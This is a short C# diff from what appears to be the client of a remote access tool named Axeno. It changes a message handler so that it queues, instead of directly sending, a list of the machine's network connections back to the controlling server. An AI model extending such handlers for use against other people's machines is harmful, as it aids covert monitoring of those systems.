@@ -20,7 +20,7 @@ namespace Axeno.Client.Networking.Functions.Networking
         public static void Handle(MsgPack msgpck)
         {
 
-            ClientSocket.Send(GetNetworkConnections());
+            ClientSocket.QueueCommand(GetNetworkConnections());
 
         }
         public static byte[] GetNetworkConnections()
